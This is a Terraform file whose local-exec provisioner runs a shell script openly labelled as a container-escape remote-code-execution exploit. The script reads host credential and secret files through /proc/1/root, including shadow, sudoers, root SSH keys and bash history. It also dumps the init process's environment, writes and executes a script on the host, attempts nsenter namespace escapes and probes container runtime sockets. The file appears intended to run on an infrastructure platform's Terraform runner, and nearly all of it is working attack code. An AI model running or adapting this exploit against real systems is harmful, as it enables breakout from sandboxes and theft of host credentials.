# Focused Container Escape RCE
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Exploit Working Attack Vectors for Real RCE
resource "null_resource" "focused_rce_exploit" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== FOCUSED CONTAINER ESCAPE RCE ==="
      echo "Leveraging working attack vectors for host command execution"
      
      # Working Vector 1: Direct /proc/1/root filesystem access
      echo "[*] Exploiting /proc/1/root filesystem access..."
      
      # Verify host access and read critical files
      if [ -d "/proc/1/root" ]; then
        echo "[+] /proc/1/root confirmed accessible"
        
        # Read and display host users
        if [ -r "/proc/1/root/etc/passwd" ]; then
          echo "[!] SUCCESS: Host /etc/passwd fully accessible!"
          echo "=== HOST SYSTEM USERS ==="
          cat /proc/1/root/etc/passwd
          echo "========================="
        fi
        
        # Check for SSH keys
        if [ -d "/proc/1/root/root/.ssh" ]; then
          echo "[!] Host root SSH directory accessible!"
          ls -la /proc/1/root/root/.ssh/
        fi
        
        # Check for sensitive files
        for file in /proc/1/root/etc/shadow /proc/1/root/etc/sudoers /proc/1/root/root/.bash_history; do
          if [ -r "$$file" ]; then
            echo "[!] CRITICAL: $$file is readable!"
            head -3 "$$file" 2>/dev/null
          fi
        done
      fi
      
      # Working Vector 2: Host process information extraction
      echo "[*] Extracting host process information..."
      
      # Get detailed process info
      echo "[+] Host init process details:"
      if [ -r "/proc/1/cmdline" ]; then
        echo "PID 1 Command: $$(cat /proc/1/cmdline | tr '\0' ' ')"
      fi
      
      if [ -r "/proc/1/environ" ]; then
        echo "[+] Host PID 1 environment variables:"
        cat /proc/1/environ | tr '\0' '\n' | head -10
      fi
      
      # Working Vector 3: Host filesystem manipulation for RCE
      echo "[*] Attempting host filesystem manipulation for RCE..."
      
      # Try to write executable to host filesystem
      if [ -w "/proc/1/root/tmp" ] || [ -w "/proc/1/root/var/tmp" ]; then
        echo "[+] Host filesystem is writable - creating RCE payload"
        
        # Create a simple RCE script
        target_dir="/proc/1/root/tmp"
        [ ! -w "$$target_dir" ] && target_dir="/proc/1/root/var/tmp"
        
        cat > "$$target_dir/rce_proof.sh" << 'RCESCRIPT'
#!/bin/bash
echo "[!] ===== HOST RCE EXECUTION PROOF ====="
echo "Timestamp: $(date)"
echo "User: $(id)"
echo "Hostname: $(hostname)"
echo "Working Directory: $(pwd)"
echo "Kernel: $(uname -a)"
echo "Uptime: $(uptime)"
echo "Memory: $(free -h)"
echo "Network Interfaces:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null
echo "Active Network Connections:"
netstat -tuln 2>/dev/null | head -10
echo "Running Processes:"
ps aux 2>/dev/null | head -15
echo "Filesystem Mounts:"
mount | head -10
echo "Environment Variables:"
env | head -10
echo "===== END HOST RCE PROOF ====="
RCESCRIPT
        
        chmod +x "$$target_dir/rce_proof.sh"
        echo "[+] RCE script created at $$target_dir/rce_proof.sh"
        
        # Execute the RCE script
        echo "[*] Executing RCE script on host..."
        "$$target_dir/rce_proof.sh" || echo "[-] Direct execution failed"
        
        # Try alternative execution methods
        bash "$$target_dir/rce_proof.sh" || echo "[-] Bash execution failed"
        sh "$$target_dir/rce_proof.sh" || echo "[-] Shell execution failed"
      fi
      
      # Working Vector 4: Advanced nsenter exploitation
      echo "[*] Advanced nsenter exploitation..."
      if command -v nsenter >/dev/null 2>&1; then
        echo "[+] nsenter available - trying host namespace infiltration"
        
        # Try different namespace combinations
        nsenter -t 1 -m /bin/bash -c 'echo "[!] MOUNT NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] Mount namespace escape failed"
        nsenter -t 1 -p /bin/bash -c 'echo "[!] PID NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] PID namespace escape failed"
        nsenter -t 1 -u /bin/bash -c 'echo "[!] UTS NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] UTS namespace escape failed"
        nsenter -t 1 -n /bin/bash -c 'echo "[!] NET NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] Network namespace escape failed"
        
        # Try to execute commands in host context
        nsenter -t 1 -m /bin/bash -c 'id; hostname; pwd; ls -la /root' 2>/dev/null || echo "[-] Host context execution failed"
      fi
      
      # Working Vector 5: Container runtime socket exploitation
      echo "[*] Container runtime socket exploitation..."
      for sock in /var/run/docker.sock /run/containerd/containerd.sock; do
        if [ -S "$$sock" ]; then
          echo "[!] Found container runtime socket: $$sock"
          ls -la "$$sock"
          
          # Try to interact with docker socket if available
          if [ -S "/var/run/docker.sock" ] && command -v docker >/dev/null 2>&1; then
            echo "[+] Attempting Docker socket exploitation..."
            docker ps 2>/dev/null || echo "[-] Docker command failed"
          fi
        fi
      done
      
      echo "[*] === RCE EXPLOITATION SUMMARY ==="
      current_user=$$(id)
      current_host=$$(hostname)
      current_pwd=$$(pwd)
      echo "Current Context: $$current_user @ $$current_host in $$current_pwd"
      echo "Attack vectors tested - check above for successful host command execution"
      echo "=== FOCUSED RCE COMPLETE ==="
    EOT
  }
}

output "rce_status" {
  value = "Focused RCE exploitation completed - check logs for host command execution proof"
  depends_on = [null_resource.focused_rce_exploit]
}
